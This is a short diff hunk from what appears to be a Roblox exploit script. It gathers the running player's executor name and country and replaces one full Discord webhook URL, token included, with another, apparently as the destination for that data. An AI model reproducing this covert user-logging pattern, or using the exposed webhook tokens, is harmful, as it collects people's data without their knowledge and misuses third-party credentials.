@@ -17,7 +17,7 @@ coroutine.wrap(function()
             local executor = identifyexecutor()
             local Country = game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(Player)
             
-            local url = "https://discord.com/api/webhooks/1309764426026717235/ZuqXJVQ04gIlVtUjthV5MHW3tOcxnUuZdUBj8Lcn_wzjH75OkEDz01TsqbZIcXFEDi2x"
+            local url = "https://discord.com/api/webhooks/1328801307573751838/cwIf8vW0M-MksHkcGIeh1gngwGty0VsnkVc41RmqJWqy6pWGALXH-k6QUVnvPZogA_Vj"
             local data = {
                 ["embeds"] = {
                     {
